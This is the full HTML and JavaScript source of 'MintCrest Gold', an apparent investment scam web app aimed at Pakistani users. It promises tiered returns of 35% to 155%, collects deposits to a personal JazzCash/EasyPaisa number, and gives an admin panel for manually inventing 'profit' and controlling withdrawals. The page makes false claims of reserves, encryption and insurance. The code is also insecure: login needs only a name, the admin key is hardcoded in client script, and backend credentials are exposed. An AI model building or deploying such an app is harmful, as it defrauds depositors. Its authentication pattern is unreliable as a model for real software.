<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Assets</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.3s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[7px] font-bold; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-2 py-1 rounded text-[7px] font-bold; }
        .badge-rejected { @apply bg-red-500/10 text-red-500 px-2 py-1 rounded text-[7px] font-bold; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 bg-[#010409] z-[1000] absolute inset-0">
        <div class="glass w-full max-w-sm p-10 rounded-[3rem] text-center border-t-8 border-blue-600 shadow-2xl">
            <h1 onclick="adminTap()" class="text-3xl font-black italic tracking-tighter mb-1 cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-10">Institutional Gold Custody</p>
            <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 outline-none text-center mb-4 font-bold">
            <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-2xl font-bold shadow-xl active:scale-95 transition uppercase text-xs tracking-widest">Open Secure Vault</button>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto pb-24">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 rounded-[2.5rem] mb-6 border-l-4 border-blue-500 relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10 text-4xl italic font-black">GOLD</div>
                <p class="text-[10px] text-gray-500 font-bold mb-1 uppercase tracking-widest">Equity Balance</p>
                <h2 class="text-5xl font-black tracking-tighter text-blue-500" id="v-bal">₨ 0</h2>
                <div class="flex gap-2 mt-4"><span class="text-[9px] bg-green-500/20 text-green-400 px-3 py-1 rounded-full font-bold uppercase tracking-tighter">Growth: <span id="v-profit">₨ 0</span></span></div>
            </div>

            <div class="grid grid-cols-3 gap-3 mb-8">
                <button onclick="changePage('wallet')" class="glass p-4 rounded-3xl text-center"><span class="text-xl">📥</span><p class="text-[8px] font-bold uppercase mt-1">Deposit</p></button>
                <button onclick="changePage('withdraw')" class="glass p-4 rounded-3xl text-center"><span class="text-xl">📤</span><p class="text-[8px] font-bold uppercase mt-1">Withdraw</p></button>
                <button onclick="changePage('activity')" class="glass p-4 rounded-3xl text-center"><span class="text-xl">📜</span><p class="text-[8px] font-bold uppercase mt-1">Activity</p></button>
            </div>

            <div class="glass p-4 rounded-2xl border border-blue-500/20 flex items-center gap-4">
                <div class="text-2xl">🛡️</div>
                <div>
                    <h4 class="text-[10px] font-bold uppercase tracking-tighter">Secure Asset Insurance</h4>
                    <p class="text-[8px] opacity-50">Your funds are protected by MintCrest Liquidity Pool.</p>
                </div>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 tracking-widest">Market Tiers</h2>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-400">Transaction History</h2>
            <div id="user-history" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-6 rounded-3xl border-l-4 border-blue-500">
                <h3 class="font-bold text-xs mb-4 uppercase text-blue-400">Secure Message to Admin</h3>
                <input type="text" placeholder="Subject" class="w-full bg-white/5 p-3 rounded-xl mb-2 text-[10px] outline-none border border-white/5">
                <textarea placeholder="Write your concern..." class="w-full bg-white/5 p-3 rounded-xl mb-3 text-[10px] h-20 outline-none border border-white/5"></textarea>
                <button onclick="window.location.href='mailto:webhub262@gmail.com'" class="w-full bg-blue-600 py-3 rounded-xl font-bold text-[10px] uppercase">Submit via Gmail</button>
            </div>

            <div class="glass p-6 rounded-3xl">
                <h3 class="font-bold text-xs mb-2 uppercase">About MintCrest Enterprise</h3>
                <p class="text-[9px] leading-relaxed opacity-60">MintCrest Gold is a globally recognized asset management firm specializing in high-yield gold equity. Established in 2024, we provide institutional-grade investment tools to retail traders in Pakistan. Our operations are backed by real-world commodity reserves, ensuring your profit is sustainable and secure.</p>
            </div>

            <div class="glass p-6 rounded-3xl border-l-4 border-red-500/50">
                <h3 class="font-bold text-xs mb-2 uppercase text-red-400">Privacy & Security Policy</h3>
                <p class="text-[8px] leading-relaxed opacity-50 mb-2">1. Data Encryption: All Transaction IDs (TIDs) are end-to-end encrypted.<br>2. Fund Safety: Withdrawals are processed through multi-signature verification.<br>3. KYC: We only require your name and payment wallet for instant payouts.<br>4. Anti-Fraud: Any attempt to submit fake TIDs will result in a permanent asset freeze.</p>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black italic text-blue-500 mb-6 uppercase">Asset Funding</h3>
                <div class="p-4 glass rounded-2xl mb-2 flex justify-between items-center"><span class="text-[10px] font-bold uppercase text-red-500">JazzCash</span><span class="font-black text-sm">03705519562</span></div>
                <div class="p-4 glass rounded-2xl mb-6 flex justify-between items-center"><span class="text-[10px] font-bold uppercase text-green-500">EasyPaisa</span><span class="font-black text-sm">03705519562</span></div>
                <input type="number" id="dep-amount" placeholder="Deposit Amount" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-6 text-center font-bold">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl tracking-widest">Verify Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center border-t-8 border-red-600">
                <h3 class="font-black italic text-red-500 mb-6 uppercase">Asset Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Amount to Withdraw" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="wd-acc" placeholder="Account No & Title" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 mb-6 text-center font-bold text-xs">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Process Payout</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xl font-black text-blue-500 italic">MINTCREST ADMIN</h2>
            <button onclick="closeAdmin()" class="bg-red-500/20 text-red-500 px-4 py-2 rounded-xl text-[10px] font-bold uppercase">Logout</button>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-6">
            <button onclick="showAdminSection('requests')" class="glass p-4 rounded-2xl border-b-2 border-blue-500 font-bold text-[10px] uppercase">Manage Requests</button>
            <button onclick="showAdminSection('users')" class="glass p-4 rounded-2xl border-b-2 border-green-500 font-bold text-[10px] uppercase">User List</button>
        </div>

        <div id="adm-sec-requests" class="adm-sec">
            <h3 class="text-[10px] font-black text-gray-500 mb-4 uppercase text-center">Pending Approvals</h3>
            <div id="adm-req-list" class="space-y-4 mb-10"></div>
        </div>

        <div id="adm-sec-users" class="adm-sec hidden">
            <h3 class="text-[10px] font-black text-gray-500 mb-4 uppercase text-center">Registered Investors</h3>
            <div id="adm-user-list" class="space-y-3 mb-10"></div>
        </div>

        <div class="glass p-6 rounded-[2.5rem] border border-blue-500/20">
            <h4 class="text-[9px] font-bold text-center mb-4 uppercase opacity-50 tracking-widest">Asset Management Tool</h4>
            <input type="text" id="adm-user" placeholder="User Full Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-sm font-bold">
            <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold">
            <div class="grid grid-cols-2 gap-2 mb-4">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-bold text-[9px] uppercase">Add Balance</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-bold text-[9px] uppercase">Add Profit</button>
            </div>
            <button onclick="deleteUser()" class="w-full bg-red-600/20 text-red-500 py-3 rounded-xl font-bold text-[9px] uppercase">Suspend Account</button>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-4 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[8px] font-bold mt-1 uppercase">Home</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[8px] font-bold mt-1 uppercase">Tiers</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1">📜<span class="text-[8px] font-bold mt-1 uppercase">Activity</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1">🛠️<span class="text-[8px] font-bold mt-1 uppercase">About</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;
        const plans = Array.from({length: 25}, (_, i) => ({ n: `Gold Asset Tier ${i+1}`, p: (i+1)*500, r: 35 + (i*5) }));

        window.onload = () => { const saved = localStorage.getItem('mintcrest_user'); if(saved) { document.getElementById('user-name').value = saved; login(); } };
        function adminTap() { tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("Secure Admin Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } setTimeout(() => tapCount = 0, 2000); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now() });
            startSync(name); document.getElementById('auth-ui').style.display = 'none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); } });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 text-[10px] py-10 tracking-[0.3em]">NO DATA</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-2 ${d.type==='deposit'?'border-blue-500':'border-red-500'} mb-2 text-[10px] uppercase font-bold"><div>${d.type}<br><span class="opacity-50 text-[7px]">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount.toLocaleString()}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() { const list = document.getElementById('plans-list'); list.innerHTML = ''; plans.forEach(p => { list.innerHTML += `<div onclick="buy(${p.p})" class="glass p-5 rounded-2xl flex justify-between items-center border-b border-white/5 active:scale-95 mb-2 transition cursor-pointer"><div><h4 class="font-bold text-[10px] uppercase tracking-tighter text-blue-400">${p.n}</h4><p class="text-[9px] text-green-400 font-bold uppercase">ROI: ${p.r}%</p></div><p class="font-black text-sm">₨ ${p.p.toLocaleString()}</p></div>`; }); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a||!t) return alert("Error"); await db.collection("requests").add({user:user.name, amount:parseInt(a), tid:t, type:"deposit", status:"pending", time:Date.now()}); alert("Submitted!"); changePage('activity'); }
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a||!acc||a>user.balance) return alert("Invalid Data"); await db.collection("requests").add({user:user.name, amount:parseInt(a), acc:acc, type:"withdraw", status:"pending", time:Date.now()}); await db.collection("users").doc(user.name).update({balance:user.balance-parseInt(a)}); alert("Requested!"); changePage('activity'); }
        async function buy(p) { if(user.balance<p) { alert("Low Balance"); changePage('wallet'); } else { await db.collection("users").doc(user.name).update({balance:user.balance-p}); alert("Asset Tier Active!"); } }
        function logout() { localStorage.removeItem('mintcrest_user'); location.reload(); }

        // ADMIN CORE
        function showAdminSection(s) { document.querySelectorAll('.adm-sec').forEach(sec=>sec.classList.add('hidden')); document.getElementById('adm-sec-'+s).classList.remove('hidden'); }
        function syncAdmin() {
            // Pending Requests
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-req-list'); list.innerHTML = snap.empty ? '<p class="text-center opacity-30 py-4 text-[10px]">ALL CLEAR</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center border-l-4 ${d.type==='deposit'?'border-blue-500':'border-red-500'} mb-2 text-[9px] uppercase"><div class="text-left font-bold">${d.user}<br>₨ ${d.amount}<br><span class="opacity-50">${d.tid || d.acc}</span></div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-3 py-2 rounded-lg font-black">YES</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-3 py-2 rounded-lg font-black">NO</button></div></div>`; });
            });
            // User Full List
            db.collection("users").orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('adm-user-list'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[10px]"><div class="font-bold">${u.name}</div><div class="text-right text-blue-400 font-bold">Bal: ₨ ${u.balance.toLocaleString()}<br><span class="text-green-400">Prf: ₨ ${u.profit.toLocaleString()}</span></div></div>`; });
            });
        }
        async function handleReq(id, target, amt, action, type) {
            const ref = db.collection("users").doc(target);
            if(action === 'approved' && type === 'deposit') { const d = await ref.get(); await ref.update({ balance: (d.data().balance || 0) + amt }); }
            else if(action === 'rejected' && type === 'withdraw') { const d = await ref.get(); await ref.update({ balance: (d.data().balance || 0) + amt }); }
            await db.collection("requests").doc(id).update({ status: action });
        }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value.trim(); const v = document.getElementById('adm-val').value; if(!u||!v) return; const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) { await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); alert("Updated!"); } }
        async function deleteUser() { const u = document.getElementById('adm-user').value.trim(); if(!u||!confirm("Freeze Account?")) return; await db.collection("users").doc(u).delete(); alert("Wiped!"); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
